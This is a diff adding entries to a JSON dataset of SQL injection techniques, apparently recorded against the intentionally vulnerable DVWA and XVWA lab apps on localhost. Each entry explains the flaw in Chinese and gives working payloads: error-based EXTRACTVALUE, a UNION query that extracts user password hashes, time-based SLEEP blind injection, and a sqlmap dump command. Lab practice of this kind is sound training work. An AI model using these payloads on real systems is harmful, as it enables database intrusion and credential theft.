@@ -27,5 +27,31 @@
     "reference_payload": "Cookie: id=1' AND 7171=7171 AND 'MXrC'='MXrC  (sqlmap -u .../sqli_blind/ --cookie \"id=1*\" --technique=B -D dvwa -T users -C user --dump)",
     "principle": "布尔盲注：无回显，用查询条件真/假对应页面 exists(200) vs MISSING(404) 差异逐位推断数据；Cookie 中 id 参数拼接注入",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030181923",
+    "context": "XVWA sqli: POST search 参数拼进 LIKE '%$search%' 字符串查询，无过滤/无转义；item 参数也直接拼 itemid。sqlmap 确认 boolean/error(EXTRACTVALUE)/time(SLEEP)/UNION(7列) 四种技术，拖出 xvwa 库 caffaine/comments/users 表及 users 密码哈希。",
+    "reference_payload": "search=1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT database())))-- -   /   search=1' UNION ALL SELECT NULL,CONCAT(user,0x3a,password),NULL,NULL,NULL,NULL,NULL FROM xvwa.users#",
+    "principle": "字符串拼接SQL无预编译 → 单引号闭合后报错/UNION/盲注可拖库；7列对齐UNION拖数据",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/sqli/",
+    "evidence": {
+      "match": "xvwa",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/sqli/ (POST search=1' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT database())))-- -)",
+      "verify": "echo"
+    }
+  },
+  {
+    "id": "auto-20261030182308",
+    "context": "XVWA sqli_blind: POST search 参数同样拼进 LIKE 字符串查询，但用 @mysql_numrows 屏蔽错误、无回显，只能布尔/时间盲注。sqlmap time-based blind (SLEEP) 成功注入并拖出 current database='xvwa'。",
+    "reference_payload": "search=1' AND (SELECT 3910 FROM (SELECT(SLEEP(5)))xCYe) AND 'tpxK'='tpxK&item=",
+    "principle": "错误屏蔽+无回显但查询可注入 → 时间盲注 SLEEP 逐字提取数据；布尔盲注靠有/无结果条数差",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/sqli_blind/",
+    "evidence": {
+      "match": "xvwa",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/sqli_blind/ (POST search=1' AND (SELECT(SLEEP(5)))-- -)",
+      "verify": "delay"
+    }
   }
 ]
